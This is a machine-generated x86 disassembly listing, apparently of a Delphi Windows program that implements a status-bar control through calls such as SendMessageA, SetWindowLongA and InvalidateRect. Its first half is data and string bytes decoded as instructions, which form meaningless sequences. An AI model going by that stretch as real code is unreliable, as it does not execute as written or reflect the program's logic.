add [ eax - 0x1 ] al
pop ss
add [ eax ] cl
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
adc [ eax ] eax
or ecx [ ecx + 0x6e ]
jbe r-xdata
add [ eax ] eax
jb r-xdata
add [ eax ] al
or eax [ eax ]
pop es
inc ecx
add [ edi + edi * 2 + 0x44 ] cl
add [ ecx ] ah
add bh bh
loopne r-xdata
adc [ eax ] al
add [ eax + eax ] 0x0
add [ edx ] dl
add [ ecx ] cl
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x737265
enter 0x45 0x7c
add [ eax ] al
inc [ ecx + edx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090015 ] al
outsd
jo r-xdata
outsd
je r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc ebp
add [ eax ] cl
cmp al [ ebp ]
pop es
push esp
dec eax
outsd
je r-xdata
sbb [ edi ] dh
inc esp
add [ ebp + eax * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc ecx
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08001a ] al
outsb
inc ebx
push 0x65676e61
fadd [ edi + 0x1300044 ]
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
push cs
dec edi
outsb
jo r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
js r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
add [ eax + eax ] cl
add [ eax ] al
inc esp
outsd
ja r-xdata
add bh bh
fadd [ eax ]
add bh bh
push eax
outsd
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
sub [ ecx + 0xd80044 ] al
xor [ eax ] eax
adc al 0x45
dec ebp
outsd
jbe r-xdata
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b001f ] al
jo r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop eax
mov al [ ecx ]
push 0x7000418b
mov eax [ ecx ]
jb r-xdata
inc ebx
outsd
insd
insd
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x14004031 ] al
inc ebp
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
dec edi
push edi
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001c ] al
outsb
inc ebp
outsb
je r-xdata
andps xmm1 [ ebp + 0x6f ]
outsd
jb r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
inc edx
add [ eax ] dl
add [ eax ] al
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f090020 ] al
inc eax
add [ edi + ebp * 2 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06001d ] al
outsb
inc ebp
js r-xdata
add bh bh
add al [ eax ]
push cs
or al 0x6f
inc ebx
add [ esi + ebx * 2 + 0x41 ] bh
add [ eax ] al
push ebp
jo r-xdata
outsb
je r-xdata
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
or [ edi + 0x6e ] ecx
outsb
je r-xdata
or [ edx + 0x61 ] eax
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
sbb eax 0x140042
add bh bh
cld
mov cl 0x43
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add bh bh
insb
outsd
jb r-xdata
insb
jae r-xdata
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ebx ] cl
test al 0x6e
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00436e ] ch
add [ eax ] al
add [ eax + esi * 2 + 0x33d80040 ] cl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec43aec8
xor eax [ eax ]
loopne r-xdata
inc ebx
outsd
outsb
je r-xdata
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
sbb eax 0xc0042
add bh bh
cld
mov cl 0x43
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
inc [ ecx ]
add [ ecx ] cl
push esp
js r-xdata
add [ eax ] al
add [ eax + 0x800421d ] ch
add [ eax ] al
add [ edi + ebp * 2 ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
outsd
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] cl
pop esi
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax * 2 + 0x6d6d6f43 ] dl
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x6b636142
sbb eax 0x100042
add bh bh
cld
mov cl 0x43
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc [ edx ]
add [ esi ] cl
sub al 0x6f
inc ebx
add [ edi ] al
outsb
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
in al 0x33
inc eax
add [ eax ] bl
or [ edx ] al
in al dx
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
add [ esi ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc ecx
inc ebx
outsd
sbb eax 0x1c0042
add bh bh
cld
mov cl 0x43
add [ ecx ] al
add [ eax ] al
add [ 0x13000000 ] al
add [ eax ] al
inc [ 0x72541100 ]
popad
imul ebp [ ecx + ebp * 2 + 0x6e ] 0x78655467
je r-xdata
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
insb
mov bl 0x43
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add al dl
mov dl 0x43
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
outsd
insb
outsd
jb r-xdata
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xor eax [ eax ]
inc eax
add [ eax + 0x4370 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4371 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x43 ] dh
add [ eax + 0x2 ] dl
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
sub_4370e6
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_437416
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_43743a
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
sub al 0xbe
inc ebx
add [ eax ] dl
or al 0x45
add al bh
mov esi 0xfc00043
inc ebp
add ah al
cmovne eax [ eax ]
jl r-xdata
nop
dec esp
inc ebp
add [ eax ] bl
aaa
inc ebp
add [ eax ] cl
cmp al [ ebp ]
cld
mov ebp 0xb3a00043
inc ebx
add [ ecx + eax * 8 - 0x4aafffbd ] ah
inc ebx
add ah dl
rol [ ebx ] 0x8
retn 0x43
inc ebp
add [ esi + ecx ] ah
inc ebp
add [ edx + edi + 0x186c0045 ] bl
inc ebp
add [ eax + 0x1800454c ] dl
sub_4374a0
mov ah 0xc2
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2900040 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
or al 0x0
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
add [ eax ] al
add [ edi ] cl
add [ ecx ] cl
insb
inc ebp
jae r-xdata
inc esp
popad
je r-xdata
mov edi 0xbf840043
inc ebx
add al bl
mov esi 0x540f0043
je r-xdata
adc al [ eax ]
or al 0x43
popad
insb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
sub [ edi + 0x43 ] ch
add [ eax ] cl
add al [ eax ]
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0x30ff0001
dec eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add bh bh
loopne r-xdata
lea eax [ eax + eax + 0x63 ]
add [ eax ] eax
[ edi + eax * 2 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
or eax 0x65420a00
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ edi ] al
andps xmm0 [ ecx + 0x74 ]
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
add [ eax ] al
adc [ ebx ] 0x0
or [ ebx + 0x61 ] eax
insb
inc ebx
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov al 0xd2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
[ edi + eax * 2 + 0x10045 ]
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
push cs
add [ edx ] cl
inc edx
jbe r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
inc edx
jbe r-xdata
add [ gs : eax ] eax
insb
mov es [ eax + eax + 0x62 ]
add [ eax ] eax
jmp eax
add al 0x0
or eax 0x4eb00eb0
mov esp 0xbf40ffb3
inc ebx
add [ eax - 0x41 ] ah
inc ebx
add [ edi + edi * 4 - 0x4127ffbd ] al
inc ebx
add [ edi ] cl
push esp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040017 ] al
imul ebp [ ebp + 0x65 ] r-xdata
imul eax [ edx ] 0xc3c4ff00
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or al 0x53
push 0x6843776f
arpl [ gs : ebx + 0x62 ] bp
outsd
js r-xdata
hlt
outsd
insb
outsd
jb r-xdata
add [ eax + 0x2 ] dl
add [ eax + 0x42080011 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xbc65646f
jb r-xdata
insb
dec edi
jne r-xdata
jbe r-xdata
add bh bh
pushfd
inc edi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ 0x65420a00 ] cl
lea eax [ eax + eax + 0x64 ]
add [ eax ] eax
add [ ecx + esi * 2 + r-xdata ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
adc [ eax ] al
push edx
add al [ eax ]
call [ ebx + eax * 8 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebx
push 0x656b6365
test al 0x1d
inc edx
add [ eax ] dh
add bh bh
sub al 0xd3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x1aff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add bh bh
in al dx
retn 0x43
jb r-xdata
inc esp
add [ ecx + eax ] ah
insb
jae r-xdata
jb r-xdata
add [ eax ] al
or eax [ eax ]
pop es
inc ecx
call [ eax ]
dec eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ ecx ]
mov es [ eax + eax + 0x65 ]
add [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax + eax ] cl
add [ edi + edi * 2 + 0x44 ] cl
add [ ecx ] ah
add bh bh
loopne r-xdata
hlt
add [ ebx + 0x2 ] dl
add bh bh
retn
insd
push eax
imul esp [ ebx + 0x6b ] 0x74e47265
inc ebx
inc esp
add [ ebp + eax * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
sub_437a37
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
pop es
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
sub_437cf4
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_42ac84
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_437d20
push ebx
mov ebx eax
mov eax ebx
call sub_437cf4
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_437d80
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov ebp eax
mov eax ebp
call sub_453d8c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push 0xfffffff0
mov eax ebp
call sub_453a88
push eax
call GetWindowLongA
mov esi eax
test bl bl
jne r-xdata
or esi edi
not edi
and esi edi
jmp r-xdata
push esi
push 0xfffffff0
mov eax ebp
call sub_453a88
push eax
call SetWindowLongA
sub_437dc8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x15 ] 0x1
mov [ esi + 0x17 ] 0x1
xor edx edx
mov eax esi
call sub_418ddc
mov eax esi
call sub_437e9c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_437e14
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418a84
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_437f58
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_437f80
mov dl [ edi + 0x14 ]
mov eax ebx
call sub_437f28
mov dl [ edi + 0x15 ]
mov eax ebx
call sub_437f38
mov dl [ edi + 0x18 ]
mov eax ebx
call sub_437f48
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437e9c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x17 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40338c
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_40338c
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_437e70
mov [ ebx + 0x17 ] 0x1
sub_437f04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_403f74
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418e80
sub_437f58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_40432c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_403f74
xor edx edx
mov eax ebx
call sub_418e44
sub_437f90
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_418fc0
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
mov ecx eax
xor edx edx
mov eax edi
call sub_418fc0
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
sub_438014
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x18 ]
call sub_4387e4
pop esi
pop ebx
retn
mov eax esi
call sub_418e68
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x18 ]
call sub_43865c
pop esi
pop ebx
retn
sub_438044
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44f7b4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xff00000f
mov eax ebx
call sub_44d32c
mov edx 0x13
mov eax ebx
call sub_44c96c
mov dl 0x2
mov eax ebx
call sub_44c6a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov esi eax
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx ebx
call sub_44bd68
mov [ ebx + 0x215 ] 0x1
xor edx edx
mov eax ebx
call sub_44d2b8
mov [ ebx + 0x217 ] 0x1
mov eax ebx
call sub_43862c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4380fc
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x20c ]
call sub_403190
mov eax [ esi + 0x208 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44f8d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_438138
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x4
call sub_437cf4
mov edx esi
mov eax ebx
call sub_450914
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450840
cmp [ ebx + 0x215 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x216 ] 0x0
jne r-xdata
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
call sub_43c850
call sub_43c930
test al al
je r-xdata
mov al 0x1
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ esi + 0x24 ]
or eax 0x2
or eax 0x1
mov [ esi + 0x24 ] eax
pop esi
pop ebx
retn
sub_4381bb
add [ ebx - 0x75 ] dl
fdiv [ ebx ]
ror [ ebx + 0xa3ce8c3 ] cl
add [ eax ] al
mov eax ebx
call sub_450a40
mov eax [ ebx + 0x70 ]
call sub_423580
push eax
push 0x0
push 0x2001
mov eax ebx
call sub_453a88
push eax
call SendMessageA
xor ecx ecx
mov dl 0x1
mov eax ebx
call sub_4387e4
cmp [ ebx + 0x210 ] 0x0
je r-xdata
cmp [ ebx + 0x214 ] 0x0
je r-xdata
mov eax [ ebx + 0x210 ]
call sub_4043e0
push eax
push 0xff
push 0x401
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x1
push 0x409
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_438244
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
mov al 0x1
pop ebx
retn
sub_438268
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x20c ]
call sub_4245b0
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop ebx
retn
sub_4382a8
push ebx
mov ebx eax
cmp dl [ ebx + 0x214 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x214 ] dl
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x214 ]
push eax
push 0x409
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_4382e4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
lea eax [ ebp - 0x1 ]
call sub_449f18
mov edx ebx
mov ecx 0x1
mov eax r-xdata
call sub_4044c8
dec al
jne r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx ebx
mov ecx 0x1
mov eax r-xdata
call sub_4044c8
jmp r-xdata
sub_43834c
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_40338c
push eax
lea edx [ ebx + 0x210 ]
xor ecx ecx
mov eax ebx
call sub_4382e4
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x210 ]
call sub_4043e0
push eax
mov eax ebx
call sub_44d7d0
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0xff
push eax
push 0x401
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_4383b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
mov edx esi
call sub_40432c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x210 ]
mov edx esi
call sub_403f74
mov eax ebx
call sub_43834c
sub_4383dc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_452e04
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x214 ] 0x0
jne r-xdata
mov eax ebx
call sub_43834c
mov eax [ ebx + 0x208 ]
call sub_4191f8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_4387e4
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_437ffc
call sub_437e9c
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_437ffc
cmp [ eax + 0x17 ] 0x0
je r-xdata
sub_438454
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_453d8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cb90
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_437ffc
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_437f90
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4385ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_437ffc
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4385b5
mov eax [ ebp - 0x10 ]
call sub_403190
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_437ff0
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_437ffc
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_437ffc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_437ffc
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4385b5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4191f8
dec eax
jle r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4387e4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_4191f8
mov edx eax
dec edx
mov eax ebx
call sub_437ffc
mov edx [ ebp - 0x8 ]
call sub_437f80
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_437ffc
mov edx [ ebp - 0xc ]
call sub_437f80
sub_43862c
push ebx
mov ebx eax
cmp [ ebx + 0x217 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_44d280
mov edx 0xff000012
mov eax [ ebx + 0x68 ]
call sub_423a40
sub_43865c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4387bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_453d8c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4387c3
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov edx ebx
mov eax [ esi + 0x208 ]
call sub_437ffc
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ ebx + 0x19 ] 0x0
je r-xdata
mov [ ebx + 0x19 ] 0x1
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_418e68
push eax
push 0x40a
mov eax esi
call sub_453a88
push eax
call SendMessageA
push 0xffffffff
lea eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_453a88
push eax
call InvalidateRect
jmp r-xdata
mov [ ebx + 0x19 ] 0x0
xor edi edi
